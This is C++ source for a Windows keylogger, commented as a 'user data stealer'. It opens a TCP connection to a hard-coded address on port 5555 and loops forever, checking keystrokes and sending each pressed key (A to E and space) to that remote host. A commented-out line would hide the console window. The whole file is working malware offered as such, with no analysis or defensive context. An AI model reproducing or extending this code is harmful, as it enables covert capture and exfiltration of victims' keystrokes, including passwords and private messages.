#define _WINSOCK_DEPRECATED_NO_WARNINGS                       //user data stealer
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>
#include <windows.h>
#include <fstream> 


int main()
{
	                          //time for keylogger to run
//ShowWindow(GetConsoleWindow(), SW_HIDE);
WSADATA WSAData;
SOCKET server;
SOCKADDR_IN addr;
WSAStartup(MAKEWORD(2, 0), &WSAData);
server = socket(AF_INET, SOCK_STREAM, 0);
addr.sin_addr.s_addr = inet_addr("192.168.43.206");
addr.sin_family = AF_INET;
addr.sin_port = htons(5555);

connect(server, (SOCKADDR *)&addr, sizeof(addr));
 
while (1) {
  	  
  	  if( GetAsyncKeyState( 'A' ) & 0x0001 )
{
   send(server, "A", 1 , 0);
}

if( GetAsyncKeyState( 'B' ) & 0x0001 )
{
    send(server, "B", 1, 0);
    
}

if( GetAsyncKeyState( 'C' ) & 0x0001 )
{
    send(server, "C", 1, 0);
    
}

if( GetAsyncKeyState( 'D' ) & 0x0001 )
{
    send(server, "D", 1, 0);
    
}

if( GetAsyncKeyState( 'E' ) & 0x0001 )
{
    send(server, "E", 1, 0);
    
}

if( GetAsyncKeyState( VK_SPACE ) & 0x0001 )
{
    send(server, " ", 1, 0);
    
}

if(send(server, "", 0 , 0)==SOCKET_ERROR)
 break;



}


closesocket(server);
WSACleanup();

//Does the work so anytype of exit not required
//return 0;
//exit(0);                           //https://docs.microsoft.com/en-us/cpp/cpp/program-termination?view=vs-2019
//abort();

//system("exit");

}
